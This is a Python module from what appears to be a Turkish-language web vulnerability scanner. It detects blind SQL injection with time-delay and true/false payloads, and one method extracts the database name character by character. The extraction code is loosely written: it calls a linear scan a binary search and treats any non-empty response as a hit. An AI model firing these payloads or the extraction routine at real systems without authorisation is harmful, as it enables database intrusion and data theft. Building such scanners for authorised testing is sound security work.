#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Blind SQL Injection Detector - Time-based, Boolean-based
"""

import asyncio
import time
from typing import List, Dict, Any
from urllib.parse import urljoin, urlparse
from loguru import logger
import aiohttp

from .base import BaseDetector


class BlindSQLiDetector(BaseDetector):
    """Blind SQL Injection Zafiyeti Tespiti"""
    
    # Time-based payloads
    TIME_BASED_PAYLOADS = [
        "' AND SLEEP(5)--",
        "' OR SLEEP(5)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "'; WAITFOR DELAY '00:00:05'--",  # MSSQL
        "' AND pg_sleep(5)--",  # PostgreSQL
    ]
    
    # Boolean-based payloads
    BOOLEAN_PAYLOADS = [
        ("' AND '1'='1", True),
        ("' AND '1'='2", False),
        ("1' AND 1=1--", True),
        ("1' AND 1=2--", False),
    ]
    
    async def scan(self, url: str, **kwargs) -> List[Dict[str, Any]]:
        """
        Blind SQLi taraması
        
        Args:
            url: Hedef URL
        
        Returns:
            Bulunan blind SQLi zafiyetleri
        """
        vulnerabilities = []
        logger.debug(f"🐛 Blind SQLi taraması başlanıyor: {url}")
        
        try:
            # Time-based SQLi testi
            time_based = await self._test_time_based(url)
            if time_based:
                vulnerabilities.append(time_based)
            
            # Boolean-based SQLi testi
            bool_based = await self._test_boolean_based(url)
            if bool_based:
                vulnerabilities.append(bool_based)
        
        except Exception as e:
            logger.debug(f"❌ Blind SQLi tarama hatası: {str(e)}")
        
        return vulnerabilities
    
    async def _test_time_based(self, url: str) -> Dict[str, Any] or None:
        """Time-based blind SQLi testi"""
        
        for payload in self.TIME_BASED_PAYLOADS:
            test_url = f"{url}?id=1{payload}"
            
            try:
                start_time = time.time()
                response = await self._get(test_url, timeout=aiohttp.ClientTimeout(total=15))
                elapsed_time = time.time() - start_time
                
                # Eğer 5 saniye gecikmesi varsa
                if elapsed_time >= 5:
                    return self._create_vulnerability(
                        type_='Time-based Blind SQL Injection',
                        severity='Critical',
                        url=url,
                        description='Zaman gecikmesine dayanan Blind SQLi tespiti',
                        recommendation='Hazırlı ifadeler kullan, giriş doğrulaması yap',
                        poc=payload,
                        cwe='CWE-89',
                        cvss_vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'
                    )
            except asyncio.TimeoutError:
                # Timeout gerçekleşti = Blind SQLi mümkün
                return self._create_vulnerability(
                    type_='Time-based Blind SQL Injection',
                    severity='Critical',
                    url=url,
                    description='Timeout tespiti ile Blind SQLi bulundu',
                    recommendation='Hazırlı ifadeler kullan',
                    poc=payload,
                    cwe='CWE-89',
                    cvss_vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'
                )
        
        return None
    
    async def _test_boolean_based(self, url: str) -> Dict[str, Any] or None:
        """Boolean-based blind SQLi testi"""
        
        true_payload, false_payload = self.BOOLEAN_PAYLOADS[0], self.BOOLEAN_PAYLOADS[1]
        
        try:
            # True response al
            true_response = await self._get(f"{url}?id=1{true_payload[0]}")
            
            # False response al
            false_response = await self._get(f"{url}?id=1{false_payload[0]}")
            
            # Response'lar farklı mı?
            if true_response and false_response and len(true_response) != len(false_response):
                return self._create_vulnerability(
                    type_='Boolean-based Blind SQL Injection',
                    severity='High',
                    url=url,
                    description='Boolean response farklara dayanan Blind SQLi',
                    recommendation='Hazırlı ifadeler kullan',
                    poc=true_payload[0],
                    cwe='CWE-89',
                    cvss_vector='CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H'
                )
        
        except Exception as e:
            logger.debug(f"Boolean-based test hatası: {str(e)}")
        
        return None
    
    async def extract_database_name(self, url: str, injection_point: str) -> str:
        """
        Veritabanı adını çıkar (Blind SQLi)
        
        Args:
            url: Hedef URL
            injection_point: Inject editği nokta
        
        Returns:
            Veritabanı adı
        """
        db_name = ""
        
        # Binary search ile veritabanı adını çıkar
        for i in range(1, 30):
            for ascii_val in range(97, 123):  # a-z
                payload = f"' AND SUBSTRING(database(),{i},1)=CHAR({ascii_val})--"
                test_url = f"{url}?{injection_point}=1{payload}"
                
                response = await self._get(test_url)
                
                # Eğer uyuyorsa bu karakter
                if response and len(response) > 0:
                    db_name += chr(ascii_val)
                    logger.debug(f"🔍 Found: {db_name}")
                    break
        
        return db_name
